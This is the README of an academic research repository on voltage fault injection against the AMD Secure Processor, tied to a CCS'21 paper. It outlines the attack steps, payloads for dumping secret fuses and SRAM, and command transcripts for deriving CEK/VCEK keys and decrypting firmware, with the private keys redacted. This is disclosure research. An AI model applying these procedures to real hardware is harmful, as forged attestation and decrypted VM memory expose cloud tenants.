# Glitching the AMD Secure Processor

This repository contains supplemental data to our paper *One Glitch to Rule Them All: Fault Injection Attacks Against AMD's Secure Encrypted Virtualization*.
The paper will be presented at the [*28th ACM Conference on Computer and Communications Security*](https://sigsac.org/ccs/CCS2021/) (CCS'21) in Seoul.
You can find a pre-print version of the paper here: [https://arxiv.org/abs/2108.04575](https://arxiv.org/abs/2108.04575)

## TL;DR

The AMD Secure Processor (AMD-SP, formerly known as PSP) is susceptible to voltage fault injection attacks. Using our fault injection attack, we are able to execute custom code on secure processors embedded in Ryzen and Epyc CPUs of the AMD Zen series (Zen1, Zen2 and Zen3). In our paper we show how this affects the security guarantees of AMD's Secure Encrypted Virtualization technology (SEV). Furthermore, we show how an attacker can mount attacks against SEV protected virtual machines without physical access to the target host by leveraging previously extracted endorsement keys (CEK/VCEK).

## Contents

This repository contains the following components:

 - [x] Voltage Fault Injection Code
    - [x] Firmware for the Teensy µController for SVI bus packet injection
    - [x] Host code to control the Teensy
 - [x] Secrets Extraction (Payloads)
    - [x] Payload for dumping the first-stage ROM bootloader
    - [x] Payloads for dumping CCPv5 Local Storage Buffers and RAM
    - [x] Python code for extracting IDs, IKEK, CEK and VCEK-Secrets
    - [x] Python code for signing/decryption using the secrets
    - [x] Python code for downloading CEK/VCEK certificates and checking the signatures
  - [x] Proof of successful key extraction
    - [x] IDs and Certificates of the pwned CPUs Keys and the signed paper title

## SEV Background

AMD's Secure Encrypted Virtualization technology aims to protect virtual machines from higher-privileged entities such as cloud administrators or compromised hypervisors.
The technology is best explained in AMD's white papers:

[SEV white paper](https://developer.amd.com/wordpress/media/2013/12/AMD_Memory_Encryption_Whitepaper_v7-Public.pdf)  
[SEV Encrypted State (SEV-ES) white paper](https://www.amd.com/system/files/TechDocs/Protecting%20VM%20Register%20State%20with%20SEV-ES.pdf)  
[SEV Secure Nested Paging (SEV-SNP) white paper](https://www.amd.com/system/files/TechDocs/SEV-SNP-strengthening-vm-isolation-with-integrity-protection-and-more.pdf)  

More SEV related files and documentation can be found [here](https://developer.amd.com/sev/)


## Attack

The goal of our attack is to execute custom code on the AMD Secure Processor (AMD-SP), previously known as Platform Security Processor (PSP). The AMD-SP is the root-of-trust of AMD CPUs and hosts the firmware that implements the SEV API. 

You can find more information about the AMD-SP in our previous talks:
[CCC 36c3](https://media.ccc.de/v/36c3-10942-uncover_understand_own_-_regaining_control_over_your_amd_cpu)
[Blackhat 2020](https://www.youtube.com/watch?v=KR8bPLj4nKE)

To execute custom code on the AMD-SP, we introduce a voltage glitch in the AMD-SP's ROM bootloader. The ROM bootloader is the first component that executes on an AMD CPU. It does some basic system initialization and then loads a public key from SPI attached flash memory. The public key is validated by comparing its hash against a fixed hash stored inside the SP's ROM. This public key is used to validate the signature of several other firmware components that are loaded from the SPI flash.
The first executable component that is loaded from the SPI flash is the PSP_FW_BOOT_LOADER. This component is executed in the privileged SVC mode of the SP and acts as a small operating system for the SP.
Our goal is to glitch the AMD-SPs validation of the public key, so that we are able to use our own public key to sign the AMD-SP's firmware components.

The basic steps required for our attack are:

1. Prepare SPI flash image with payload
   - Replace original public key with our own public key
   - Replace the PSP_FW_BOOT_LOADER with our payload
   - Re-sign the PSP_FW_BOOT_LOADER with using our own public key
   - Flash the image on the target's SPI flash
2. Glitch the target CPU
   - Determine glitching parameters
   - Run glitch attempts until successful
3. Exfiltrate Data using the SPI bus
   - Write the data on the memory-mapped SPI flash
   - Use a Logic Analyzer to gather the data written to the SPI bus
   - Alternatively the UART interface could be used to exfiltrate data

We descibe the necessary hardware, provide the necessary software and describe the whole process in more detail
[here: attack-code/README.md](attack-code/README.md).

## Payloads

We provided four payloads for the voltage glitching attacks.
They can be found in the [payloads](./payloads) folder and compiled using the `arm-none-eabi-*` toolchain.
All of the payloads run on a Epyc-Zen3 target (some constants need to be changed for other targets).

The **hello-world** payload is a simple testing payload that helps debugging/confirming code execution on the amd-sp.

The **get-secret-fuses** payload reads the secret fuses and writes them to the SPI bus.
Once they have been extracted (e.g. using a logic analyzer) they can be converted into the CEK as follows:
```
$ ./secret_fuses_to_cek.py secret_fuses.bin cek.pem
secret fuses:
  *   = <xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx>
cek:
  id  = ded5992ef2ed25e5325748671b6114e5cfac801d7420b3d289c833db2bf755ea735bbe1092e5cd33bc4e31af1a2880ad8d1fbf640c8f80dc02ba464e6c6c9395
  d   = <xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx>
  p_x = 35a2c156dd87307f5b0640948b244875deba4896e13065caab8325238b44a4b5be91a310a69a11b17be93e1aa942b947
  p_y = 724b19e07caf3c4e08c07b382700b58375fdc6cfe6b4aafb640835505a1bf14cd485695d5c006300678ab8b863a620b1
$ openssl ec -noout -text -in cek.pem 
read EC key
Private-Key: (384 bit)
priv:
    xx:xx:xx:xx:xx:xx:xx:xx:xx:xx:xx:xx:xx:xx:xx:
    xx:xx:xx:xx:xx:xx:xx:xx:xx:xx:xx:xx:xx:xx:xx:
    xx:xx:xx:xx:xx:xx:xx:xx:xx:xx:xx:xx:xx:xx:xx:
    xx:xx:xx
pub:
    04:47:b9:42:a9:1a:3e:e9:7b:b1:11:9a:a6:10:a3:
    91:be:b5:a4:44:8b:23:25:83:ab:ca:65:30:e1:96:
    48:ba:de:75:48:24:8b:94:40:06:5b:7f:30:87:dd:
    56:c1:a2:35:b1:20:a6:63:b8:b8:8a:67:00:63:00:
    5c:5d:69:85:d4:4c:f1:1b:5a:50:35:08:64:fb:aa:
    b4:e6:cf:c6:fd:75:83:b5:00:27:38:7b:c0:08:4e:
    3c:af:7c:e0:19:4b:72
ASN1 OID: secp384r1
NIST CURVE: P-384
```

The **dump-sram** payload dumps the sram state just after the execution of the rom-bootloader.
Since this includes the bootloader VCEK secrets (and since `./make_epyc3_pl.py` sets the bootloader SVN to 255) we can extract these secrets and build all VCEKs:
```
$ xxd sram_dump.bin
...
0004efe0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0004eff0: xxxx xxxx xxxx xxxx xxxx xxxx xxxx xxxx  xxxxxxxxxxxxxxxx
0004f000: xxxx xxxx xxxx xxxx xxxx xxxx xxxx xxxx  xxxxxxxxxxxxxxxx
0004f010: xxxx xxxx xxxx xxxx xxxx xxxx xxxx xxxx  xxxxxxxxxxxxxxxx
0004f020: xxxx xxxx xxxx xxxx xxxx xxxx xxxx xxxx  xxxxxxxxxxxxxxxx
0004f030: xxxx xxxx xxxx xxxx xxxx xxxx xxxx xxxx  xxxxxxxxxxxxxxxx
0004f040: xxxx xxxx xxxx xxxx xxxx xxxx xxxx xxxx  xxxxxxxxxxxxxxxx
0004f050: 0000 0000 0000 0000 0000 0000 0000 0000  ................
...
$ dd if=sram_dump.bin bs=1 skip=323568 count=96 of=vcek_secrets_bl_ver_255.bin
96+0 records in
96+0 records out
96 bytes copied, 0,00140416 s, 68,4 kB/s
$ ./bl_seed_to_vcek.py vcek_secrets_bl_255.bin 255 1 2 3 4 vcek_01020304.pem
vcek [bl=0x1, tee=0x2, snp=0x3, ucode=0x4]:
  d   = <xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx>
  p_x = a25a75344367103fbeaaa6d14d8aa3d5046e7b857be95df18850f63045cf4a48157b9dc90e48c386b241f60e53937913
  p_y = 974e1042d632951193d6fb81586474f9003625a74e304d2fc53007754f60f70d19bb8c6946a7b0851b8b433af4ddefb6
$ openssl ec -noout -text -in cek.pem
read EC key
Private-Key: (384 bit)
priv:
    xx:xx:xx:xx:xx:xx:xx:xx:xx:xx:xx:xx:xx:xx:xx:
    xx:xx:xx:xx:xx:xx:xx:xx:xx:xx:xx:xx:xx:xx:xx:
    xx:xx:xx:xx:xx:xx:xx:xx:xx:xx:xx:xx:xx:xx:xx:
    xx:xx:xx
pub:
    04:13:79:93:53:0e:f6:41:b2:86:c3:48:0e:c9:9d:
    7b:15:48:4a:cf:45:30:f6:50:88:f1:5d:e9:7b:85:
    7b:6e:04:d5:a3:8a:4d:d1:a6:aa:be:3f:10:67:43:
    34:75:5a:a2:b6:ef:dd:f4:3a:43:8b:1b:85:b0:a7:
    46:69:8c:bb:19:0d:f7:60:4f:75:07:30:c5:2f:4d:
    30:4e:a7:25:36:00:f9:74:64:58:81:fb:d6:93:11:
    95:32:d6:42:10:4e:97
ASN1 OID: secp384r1
NIST CURVE: P-384
```

The **decrypt-ikek** payload loads the IKEK from a BIOS image, decrypts it and dumps it onto the SPI bus for exfiltration.
To use it we extract an entry from a firmware image and confirm that it is encrypted (in this case using strings):
```
$ psptool -X -d <dir nr> -e <entry nr> -o /tmp/entry-enc <path-to-fw-image>
$ strings -n 20 /tmp/entry
$
```
Then we use the provided python script and extracted ikek to decrypt the entry and confirm our decryption:
```
$ ./decrypt_firmware_entry.py <ikek binary> /tmp/entry /tmp/entry-dec
$ strings -n 100 /tmp/entry-dec 
~}|{zyxwvvutsrqqponnmllkjjihhgffeddccbaa``__^^]]\\[[ZZYYXXWWVVUUUTTSSRRRQQPPPOOONNMMMLLLKKKJJJIIIHHHGGGGFFFEEEDDDDCCCCBBBBAAA
$
```

## Proof of Key extraction

To check our proof of key extraction please read [attack-proof.md](attack-proof/attack-proof.md).

### Proof-of-concept Attack

Using the extracted (V)CEKs, an attacker can fake SEV's attestation reports or pose as a valid migration target of SEV protected VM's.
This allows an attacker to fully decrypt a VM's memory.

You can find a proof-of-concept implementation of the migration attack [here](https://github.com/RobertBuhren/amd-sev-migration-attack).

Using our glitching attack we are able to extract valid (V)CEKs for AMD Epyc Naples, Rome and Milan CPUs, enabling this attack on all AMD CPUs that currently support SEV.

